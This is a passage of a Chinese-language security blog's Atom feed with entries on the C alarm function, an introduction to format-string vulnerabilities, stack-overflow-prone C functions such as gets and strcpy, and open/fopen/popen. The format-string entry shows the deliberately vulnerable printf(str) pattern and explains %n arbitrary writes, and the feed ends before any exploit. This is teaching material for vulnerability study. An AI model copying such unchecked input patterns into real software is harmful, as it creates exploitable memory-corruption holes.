rel="noopener">https://mp.weixin.qq.com/s/Q4A6LwCd2E29uSXjMJs1dg</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;p&gt;1、利用glibc-2.27的tcache机制连续释放八次unsortedbin，再输出，可以leak出libc的基址&lt;br&gt;2、利用uns
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>linux c alarm函数</title>
    <link href="https://nocbtm.github.io/2019/09/11/linux-c-alarm%E5%87%BD%E6%95%B0/"/>
    <id>https://nocbtm.github.io/2019/09/11/linux-c-alarm函数/</id>
    <published>2019-09-11T08:59:42.000Z</published>
    <updated>2019-10-14T12:29:04.502Z</updated>
    
    <content type="html"><![CDATA[<h2 id="alarm"><a href="#alarm" class="headerlink" title="alarm"></a>alarm</h2><p>alarm称为闹钟函数，alarm()用来设置信号SIGALRM在经过参数seconds指定的秒数后传送给目前的进程。<br>如果参数seconds为0，则之前设置的闹钟会被取消，并将剩下的时间返回。<br>要注意的是，一个进程只能有一个闹钟时间，如果在调用alarm之前已设置过闹钟时间，则任何以前的闹钟时间都被新值所代替。</p><p>所需头文件　<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>函数原型<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alarm（<span class="keyword">unsigned</span> <span class="keyword">int</span> seconds)</span><br></pre></td></tr></table></figure></p><p>函数参数<br>　　seconds:指定秒数<br>函数返回值<br>　　成功：如果调用此alarm（）前，进程已经设置了闹钟时间，则返回上一个闹钟时间的剩余时间，否则返回0。<br>　　出错：-1</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello\n"</span>);</span><br><span class="line">    signal(SIGALRM, handler); <span class="comment">//让内核做好准备，一旦接受到SIGALARM信号,就执行 handler</span></span><br><span class="line">    alarm(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    handler();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="number">21</span>;i++)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"sleep %d ...\n"</span>,i);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：刚开始在main中执行一次，然后每隔5秒执行一次handler()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Hello</span><br><span class="line">sleep 1 ...</span><br><span class="line">sleep 2 ...</span><br><span class="line">sleep 3 ...</span><br><span class="line">sleep 4 ...</span><br><span class="line">sleep 5 ...</span><br><span class="line">Hello</span><br><span class="line">sleep 6 ...</span><br><span class="line">sleep 7 ...</span><br><span class="line">sleep 8 ...</span><br><span class="line">sleep 9 ...</span><br><span class="line">sleep 10 ...</span><br><span class="line">Hello</span><br><span class="line">sleep 11 ...</span><br><span class="line">sleep 12 ...</span><br><span class="line">sleep 13 ...</span><br><span class="line">sleep 14 ...</span><br><span class="line">sleep 15 ...</span><br><span class="line">Hello</span><br><span class="line">sleep 16 ...</span><br><span class="line">sleep 17 ...</span><br><span class="line">sleep 18 ...</span><br><span class="line">sleep 19 ...</span><br><span class="line">sleep 20 ...</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure></p><p>注意：alarm只设定一个闹钟，时间到达并执行其注册函数之后，闹钟便失效。如果想循环设置闹钟，需在其注册函数中在调用alarm函数。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;alarm&quot;&gt;&lt;a href=&quot;#alarm&quot; class=&quot;headerlink&quot; title=&quot;alarm&quot;&gt;&lt;/a&gt;alarm&lt;/h2&gt;&lt;p&gt;alarm称为闹钟函数，alarm()用来设置信号SIGALRM在经过参数seconds指定的秒数后传送给目前的进程
      
    
    </summary>
    
      <category term="c" scheme="https://nocbtm.github.io/categories/c/"/>
    
    
      <category term="c" scheme="https://nocbtm.github.io/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="https://nocbtm.github.io/2018/11/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://nocbtm.github.io/2018/11/29/格式化字符串漏洞/</id>
    <published>2018-11-29T08:41:56.000Z</published>
    <updated>2019-10-01T08:30:40.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是格式化字符串"><a href="#0x00-什么是格式化字符串" class="headerlink" title="0x00 什么是格式化字符串"></a>0x00 什么是格式化字符串</h2><p>学过c语言的都知道printf，fprintf，sprintf等这一类printf函数中经常用到”%”，后面加一个或多个字符串做说明符。<br>格式化字符串指的就是printf函数第一个参数，最常见的包括：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure></p><p>printf有一个特殊的格式化控制符%n，和其他控制输出格式和内容的格式化字符不同的是，这个格式化字符会将已输出的字符数写入到对应参数的内存中。<br>我们就利用这个漏洞实现任意地址写</p><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><h3 id="产生漏洞的原因"><a href="#产生漏洞的原因" class="headerlink" title="产生漏洞的原因"></a>产生漏洞的原因</h3><p>就是没写格式化控制符,如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char str[100];</span><br><span class="line">scanf(&quot;%s&quot;,str);</span><br><span class="line">printf(str);</span><br></pre></td></tr></table></figure></p><p>事实上，这是一种非常危险的写法。由于printf函数族的设计缺陷，当其第一个参数可被控制时，攻击者将有机会对任意内存地址进行读写操作。</p><p>一般来说，每个函数的参数个数都是固定的，被调用的函数知道应该从内存中读取多少个变量，但printf是可变参数的函数，对可变参数的函数而言，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数的调用者传入的格式一个一个的打印出数据。由于编程者的疏忽，把格式化字符串的操纵权交给用户，就会产生后面任意地址读写的漏洞。</p><p>举个栗子，主函数如下：<br><img alt="" data-src="https://i.imgur.com/qQBQjaR.png" class="lozad"><br>程序很简单，可以多次输入方便调试，<br>memset函数先把buf都初始化为0，<br>然后read函数读取键盘操作，输入buf<br>最后在输出buf。</p><p><img alt="" data-src="https://i.imgur.com/Qc3mQgM.png" class="lozad"></p><p>正常情况下我们输入什么都会输出什么，但是当我们输入一些特定的字符时输出出现了变化。</p><h2 id="0x02利用格式化字符串漏洞实现任意地址读"><a href="#0x02利用格式化字符串漏洞实现任意地址读" class="headerlink" title="0x02利用格式化字符串漏洞实现任意地址读"></a>0x02利用格式化字符串漏洞实现任意地址读</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-什么是格式化字符串&quot;&gt;&lt;a href=&quot;#0x00-什么是格式化字符串&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是格式化字符串&quot;&gt;&lt;/a&gt;0x00 什么是格式化字符串&lt;/h2&gt;&lt;p&gt;学过c语言的都知道printf，fprint
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>从非缓冲系统文件到常见栈溢出函数</title>
    <link href="https://nocbtm.github.io/2018/11/12/%E4%BB%8E%E9%9D%9E%E7%BC%93%E5%86%B2%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E5%88%B0%E5%B8%B8%E8%A7%81%E6%A0%88%E6%BA%A2%E5%87%BA%E5%87%BD%E6%95%B0/"/>
    <id>https://nocbtm.github.io/2018/11/12/从非缓冲系统文件到常见栈溢出函数/</id>
    <published>2018-11-12T14:15:12.000Z</published>
    <updated>2019-10-01T08:37:25.212Z</updated>
    
    <content type="html"><![CDATA[<p>非缓冲和缓冲是相对而言的<br>了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。</p><h2 id="什么是缓冲文件系统？"><a href="#什么是缓冲文件系统？" class="headerlink" title="什么是缓冲文件系统？"></a>什么是缓冲文件系统？</h2><p>程序在运行过程中，会自动在内存开辟一个“缓冲区”，为程序中的每一个文件使用，当执行读文件的操作时，从磁盘文件将数据先读入内存“缓冲区”，装满后再从内存“缓冲区”依此读入接收的变量。执行写文件的操作时，先将数据写入内存“缓冲区”，待内存“缓冲区”装满后再写入文件。由此可以看出，内存“缓冲区”的大小，影响着实际操作外存的次数，内存“缓冲区”越大，则操作外存的次数就少，执行速度就快、效率高。一般来说，文件“缓冲区”的大小随机器而定。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>用缓冲区可以一次读入一批数据，或输出一批数据，而不是执行一次输入或输出函数就去访问一次磁盘，这样做的目的是减少对磁盘的实际读写次数。</p><h3 id="代表函数-c语言"><a href="#代表函数-c语言" class="headerlink" title="代表函数(c语言)"></a>代表函数(c语言)</h3><p>缓冲文件系统，fopen, fclose, fread, fwrite, fgetc, fgets, fputc, fputs, freopen, fseek, ftell, rewind等</p><h2 id="非缓冲文件系统"><a href="#非缓冲文件系统" class="headerlink" title="非缓冲文件系统"></a>非缓冲文件系统</h2><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>非缓冲文件系统不由系统自动设置缓冲区，而由用户自己根据需要设置。在传统的unix系统下，用缓冲文件系统来处理文本文件，用非缓冲文件系统处理二进制文件。</p><h3 id="代表函数"><a href="#代表函数" class="headerlink" title="代表函数"></a>代表函数</h3><p>缓冲文件系统，open, close, read, write, gets, getchar, putc, putchar等</p><h2 id="栈溢出常见函数"><a href="#栈溢出常见函数" class="headerlink" title="栈溢出常见函数"></a>栈溢出常见函数</h2><table><thead><tr><th style="text-align:left">函数</th><th style="text-align:right">功能</th><th style="text-align:center">可利用漏洞</th></tr></thead><tbody><tr><td style="text-align:left">read()</td><td style="text-align:right">读取文件内容到缓冲区</td><td style="text-align:center">读到\x00和指定字节</td></tr><tr><td style="text-align:left">write()</td><td style="text-align:right">把缓冲区的内容写入到文件内</td><td style="text-align:center">写到\x00和指定字节</td></tr><tr><td style="text-align:left">gets()</td><td style="text-align:right">从输入缓冲区中读取一个字符串存储到字符指针</td><td style="text-align:center">可无限输入</td></tr><tr><td style="text-align:left">puts()</td><td style="text-align:right">输出字符串,相当于printf(“%s\n”,s)</td><td style="text-align:center">输出直到\x00</td></tr><tr><td style="text-align:left">strcpy()</td><td style="text-align:right">只能复制字符串</td><td style="text-align:center">一直复制直到遇到\x00</td></tr><tr><td style="text-align:left">memcpy()</td><td style="text-align:right">复制任意内容</td><td style="text-align:center">指定字节</td></tr><tr><td style="text-align:left">strncpy()</td><td style="text-align:right">复制指定字节字符</td><td style="text-align:center">指定字节</td></tr><tr><td style="text-align:left">printf()</td><td style="text-align:right">格式化输出</td><td style="text-align:center">输出直到\x00</td></tr><tr><td style="text-align:left">scanf()</td><td style="text-align:right">格式化输入</td><td style="text-align:center">输入与定义不同的类型或输入多与定义的数组元素</td></tr></tbody></table><p>下面是详细内容:</p><h2 id="0x00-read"><a href="#0x00-read" class="headerlink" title="0x00 read()"></a>0x00 read()</h2><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t read (int fd, void *buf, size_t nbyte)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为0从键盘读取<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要读入文件指定的字节数；</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>read()会把参数fd所指的文件传送nbyte个字节到buf指针所指的内存中。若参数nbyte为0，则read()不会有作用并返回0。</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功时,read返回实际所读的字节数,如果返回的值是0,表示已经读到文件的结束了.<br>小于0表示出现了错误.如果错误为EINTR说明读是由中断引起的, 如果是ECONNREST表示网络连接出了问题.</p><h2 id="0x01-write"><a href="#0x01-write" class="headerlink" title="0x01 write()"></a>0x01 write()</h2><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">ssize_t write(int fd,const void *buf,size_t nbytes)</span><br></pre></td></tr></table></figure><p>fd：文件描述符；fd为1输出到显示器<br>buf：指定的缓冲区，即指针，指向一段内存单元；<br>nbyte：要写入文件指定的字节数；</p><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>write()会把参数buf 所指的内存写入nbytes 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.</p><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>如果顺利write()会返回实际写入的字节数.<br>当有错误发生时则返回-1, 错误代码存入errno 中.</p><p>错误代码：</p><ul><li>EINTR 此调用被信号所中断.</li><li>EAGAIN 当使用不可阻断I/O 时 (O_NONBLOCK), 若无数据可读取则返回此值.</li><li>EADF 参数fd 非有效的文件描述词, 或该文件已关闭</li></ul><h2 id="0x02-gets"><a href="#0x02-gets" class="headerlink" title="0x02 gets()"></a>0x02 gets()</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line">char *gets(char *str);</span><br></pre></td></tr></table></figure><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>gets() 函数的功能是从输入缓冲区中读取一个字符串存储到字符指针变量 str 所指向的内存空间。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>使用 gets() 时，系统会将最后“敲”的换行符从缓冲区中取出来，然后丢弃，所以缓冲区中不会遗留换行符。这就意味着，如果前面使用过 gets()，而后面又要从键盘给字符变量赋值的话就不需要吸收回车清空缓冲区了，因为缓冲区的回车已经被 gets() 取出来扔掉了</p><p>gets() 时有空格也可以直接输入，但是 gets() 有一个非常大的缺陷，即它不检查预留存储区是否能够容纳实际输入的数据，换句话说，如果输入的字符数目大于数组的长度，gets 无法检测到这个问题，就会发生内存越界。</p><h2 id="0x03-strcpy-和memcpy-和strncpy"><a href="#0x03-strcpy-和memcpy-和strncpy" class="headerlink" title="0x03 strcpy()和memcpy()和strncpy()"></a>0x03 strcpy()和memcpy()和strncpy()</h2><h3 id="函数原型-3"><a href="#函数原型-3" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char* strcpy(char* dest, const char* src)</span><br><span class="line">void *memcpy( void *dest, const void *src, size_t count );</span><br><span class="line">char *strncpy(char *dest,char *src,int size_t n);</span><br></pre></td></tr></table></figure><p>dest:指向用于存储复制内容的目标数组。<br>src:要复制的字符串。<br>count：要读入文件指定的字节数；</p><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ul><li>strcpy提供了字符串的复制。即strcpy只用于字符串复制，并且它不仅复制字符串内容之外，还会复制字符串的结束符’\0’。</li><li>复制的内容不同。strcpy只能复制字符串，而memcpy可以复制任意内容，例如字符数组、整型、结构体、类等。</li><li>复制的方法不同。strcpy不需要指定长度，它遇到被复制字符的串结束符”\0”才结束，所以容易溢出。memcpy则是根据其第3个参数决定复制的长度。</li><li>用途不同。通常在复制字符串时用strcpy，而需要复制其他类型数据时则一般用memcpy</li><li>strncpy函数，只是将src的前n个字符复制到dest的前n个字符，不自动添加’\0’。如果src的长度小于n个字节，则以NULL填充dest直到复制完n个字节</li></ul><h2 id="0x04-printf-和scanf"><a href="#0x04-printf-和scanf" class="headerlink" title="0x04 printf()和scanf()"></a>0x04 printf()和scanf()</h2><p>引入：华为的一道经典面试</p><p><img alt="" data-src="https://i.imgur.com/frca7C7.png" class="lozad"></p><p>i的值输出是多少呢，没有考虑栈溢出的话，i就是5。可这里栈溢出了，i=6776421 ，这是为什么呢？<br>进入到内存中分析：<br>连续定义的变量，内存地址一般也相邻<br>首先依次在栈区为变量开辟空间（注意方式，整形是4个字节以计算，char型一字节一计算）<br>a,b,c,d,e对应的ASCII码对照表的16进制为0x61,0x62,0x63,0x64,0x65<br><img alt="" data-src="https://i.imgur.com/Rf8iJUJ.png" class="lozad"></p><p>越界后：<br><img alt="" data-src="https://i.imgur.com/s49ZZ2I.jpg" class="lozad"></p><p>所以最后的结果是0x676665的十进制6776421</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;非缓冲和缓冲是相对而言的&lt;br&gt;了解什么是非缓冲文件系统之前，先了解一下缓冲文件系统。&lt;/p&gt;
&lt;h2 id=&quot;什么是缓冲文件系统？&quot;&gt;&lt;a href=&quot;#什么是缓冲文件系统？&quot; class=&quot;headerlink&quot; title=&quot;什么是缓冲文件系统？&quot;&gt;&lt;/a&gt;什么是缓冲
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>open、fopen和popen</title>
    <link href="https://nocbtm.github.io/2018/11/07/open%E3%80%81fopen%E5%92%8Cpopen/"/>
    <id>https://nocbtm.github.io/2018/11/07/open、fopen和popen/</id>
    <published>2018-11-07T12:44:23.000Z</published>
    <updated>2019-10-01T08:39:31.897Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open"><a href="#open" class="headerlink" title="open"></a>open</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>打开设备文件<br>不带缓冲区<br>非缓冲文件系统依赖于操作系统，通过操作系统的功能对文件进行读写，是系统级的输入输出，它不设文件结构体指针，只能读写二进制文件，但效率高、速度 快</p><h3 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int open(const char *pathname, int flags);</span><br><span class="line">int open(const char *pathname, int flags, mode_t mode);</span><br><span class="line"></span><br><span class="line">所需库：</span><br><span class="line">#include &lt;sys/types.h&gt;    </span><br><span class="line">#include &lt;sys/stat.h&gt;    </span><br><span class="line">#include &lt;fcntl.h&gt;</span><br></pre></td></tr></table></figure><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>成功则返回文件描述符，否则返回 -1;</p><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p>参数 pathname 指向欲打开的文件路径字符串. 下列是参数flags 所能使用的旗标:</p><ul><li>O_RDONLY 以只读方式打开文件</li><li>O_WRONLY 以只写方式打开文件</li><li>O _RDWR 以可读写方式打开文件. 上述三种旗标是互斥的, 也就是不可同时使用, 但可与下列的旗标利用OR(|)运算符组合.</li><li>O_CREAT 若欲打开的文件不存在则自动建立该文件.</li><li>O_EXCL 如果O_CREAT 也被设置, 此指令会去检查文件是否存在. 文件若不存在则建立该文件, 否则将导致打开文件错误. 此外, 若O_CREAT 与O_EXCL 同时设置, 并且欲打开的文件为符号连接, 则会打开文件失败.</li><li>O_NOCTTY 如果欲打开的文件为终端机设备时, 则不会将该终端机当成进程控制终端机.</li><li>O_TRUNC 若文件存在并且以可写的方式打开时, 此旗标会令文件长度清为0, 而原来存于该文件的资料也会消失.</li><li>O_APPEND 当读写文件时会从文件尾开始移动, 也就是所写入的数据会以附加的方式加入到文件后面.</li><li>O_NONBLOCK 以不可阻断的方式打开文件, 也就是无论有无数据读取或等待, 都会立即返回进程之中.</li><li>O_NDELAY 同O_NONBLOCK.</li><li>O_SYNC 以同步的方式打开文件.</li><li>O_NOFOLLOW 如果参数pathname 所指的文件为一符号连接, 则会令打开文件失败.</li><li>O_DIRECTORY 如果参数pathname 所指的文件并非为一目录, 则会令打开文件失败。注：此为Linux2. 2 以后特有的旗标, 以避免一些系统安全问题. </li></ul><p>参数mode 则有下列数种组合, 只有在建立新文件时才会生效, 此外真正建文件时的权限会受到umask 值所影响, 因此该文件权限应该为 (mode-umaks).</p><ul><li>S_IRWXU00700 权限, 代表该文件所有者具有可读、可写及可执行的权限.</li><li>S_IRUSR 或S_IREAD, 00400 权限, 代表该文件所有者具有可读取的权限.</li><li>S_IWUSR 或S_IWRITE, 00200 权限, 代表该文件所有者具有可写入的权限.</li><li>S_IXUSR 或S_IEXEC, 00100 权限, 代表该文件所有者具有可执行的权限.</li><li>S_IRWXG 00070 权限, 代表该文件用户组具有可读、可写及可执行的权限.</li><li>S_IRGRP 00040 权限, 代表该文件用户组具有可读的权限.</li><li>S_IWGRP 00020 权限, 代表该文件用户组具有可写入的权限.</li><li>S_IXGRP 00010 权限, 代表该文件用户组具有可执行的权限.</li><li>S_IRWXO 00007 权限, 代表其他用户具有可读、可写及可执行的权限.</li><li>S_IROTH 00004 权限, 代表其他用户具有可读的权限</li><li>S_IWOTH 00002 权限, 代表其他用户具有可写入的权限.</li><li>S_IXOTH 00001 权限, 代表其他用户具有可执行的权限.</li></ul><p>返回值：若所有欲核查的权限都通过了检查则返回0 值, 表示成功, 只要有一个权限被禁止则返回-1.</p><p>错误代码：</p><ul><li>EEXIST 参数pathname 所指的文件已存在, 却使用了O_CREAT 和-O_EXCL 旗标.</li><li>EACCESS 参数pathname 所指的文件不符合所要求测试的权限.</li><li>EROFS 欲测试写入权限的文件存在于只读文件系统内.</li><li>EFAULT 参数pathname 指针超出可存取内存空间.</li><li>EINVAL 参数mode 不正确.</li><li>ENAMETOOLONG 参数 pathname 太长.</li><li>ENOTDIR 参数pathname 不是目录.</li><li>ENOMEM 核心内存不足.</li><li>ELOOP 参数pathname 有过多符号连接问题.</li><li>EIO I/O 存取错误.</li></ul><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>打开普通文件<br>带缓冲区<br>缓冲文件系统是借助文件结构体指针来对文件进行管理，通过文件指针来对文件进行访问，既可以读写字符、字符串、格式化数据，也可以读写二进制数据。</p><h3 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">FILE * fopen(const char * path,const char * mode);</span><br></pre></td></tr></table></figure><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>文件顺利打开后，指向该流的文件指针就会被返回。如果文件打开失败则返回NULL，并把错误代码存在errno 中。</p><h3 id="参数说明-1"><a href="#参数说明-1" class="headerlink" title="参数说明"></a>参数说明</h3><p>参数path字符串包含欲打开的文件路径及文件名，参数mode字符串则代表着流形态。<br>mode有下列几种形态字符串:<br>r 以只读方式打开文件，该文件必须存在。<br>r+ 以可读写方式打开文件，该文件必须存在。<br>rb+ 读写打开一个二进制文件，允许读写数据。<br>rw+ 读写打开一个文本文件，允许读和写。<br>w 打开只写文件，若文件存在则文件长度清为0，即该文件内容会消失。若文件不存在则建立该文件。<br>w+ 打开可读写文件，若文件存在则文件长度清为零，即该文件内容会消失。若文件不存在则建立该文件。<br>a 以附加的方式打开只写文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾，即文件原先的内容会被保留。（EOF符保留）<br>a+ 以附加方式打开可读写的文件。若文件不存在，则会建立该文件，如果文件存在，写入的数据会被加到文件尾后，即文件原先的内容会被保留。 （原来的EOF符不保留）<br>wb 只写打开或新建一个二进制文件；只允许写数据。<br>wb+ 读写打开或建立一个二进制文件，允许读和写。<br>ab+ 读写打开一个二进制文件，允许读或在文件末追加数据。<br>at+ 打开一个叫string的文件，a表示append,就是说写入处理的时候是接着原来文件已有内容写入，不是从头写入覆盖掉，t表示打开文件的类型是文本文件，+号表示对文件既可以读也可以写。<br>上述的形态字符串都可以再加一个b字符，如rb、w+b或ab+等组合，加入b 字符用来告诉函数库以二进制模式打开文件。如果不加b，表示默认加了t，即rt,wt,其中t表示以文本模式打开文件。由fopen()所建立的新文件会具有S_IRUSR|S_IWUSR|S_IRGRP|S_IWGRP|S_IROTH|S_IWOTH(0666)权限，此文件权限也会参考umask 值。<br>有些C编译系统可能不完全提供所有这些功能，有的C版本不用”r+”,”w+”,”a+”,而用”rw”,”wr”,”ar”等，读者注意所用系统的规定。</p><h2 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h2><h3 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">FILE * popen ( const char * command , const char * type );</span><br></pre></td></tr></table></figure><h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>如果调用 fork() 或 pipe() 失败，或者不能分配内存将返回NULL，否则返回标准 I/O 流。</p><h3 id="参数说明-2"><a href="#参数说明-2" class="headerlink" title="参数说明"></a>参数说明</h3><p>type 参数只能是读或者写中的一种，得到的返回值（标准 I/O 流）也具有和 type 相应的只读或只写类型。如果 type 是 “r” 则文件指针连接到 command 的标准输出；如果 type 是 “w” 则文件指针连接到 command 的标准输入。<br>command 参数是一个指向以 NULL 结束的 shell 命令字符串的指针。这行命令将被传到 bin/sh 并使用-c 标志，shell 将执行这个命令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open&quot;&gt;&lt;a href=&quot;#open&quot; class=&quot;headerlink&quot; title=&quot;open&quot;&gt;&lt;/a&gt;open&lt;/h2&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h
